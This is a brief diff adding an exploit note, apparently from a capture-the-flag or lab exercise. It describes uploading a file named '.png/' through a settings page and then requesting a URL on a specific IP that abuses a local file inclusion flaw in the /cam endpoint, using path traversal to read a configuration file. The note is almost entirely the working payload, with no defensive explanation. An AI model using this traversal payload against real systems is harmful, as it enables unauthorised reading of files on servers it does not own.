@@ -1,0 +1,9 @@
+Via settings:
+Filename: .png/
+File: doesnt matter
+
+
+Via source code, see /cam is vulnerable to local file include
+http://52.34.3.80/cam?camera=../upload/fcxSnHVL/.png/../../../../files/gnome.conf
+
+
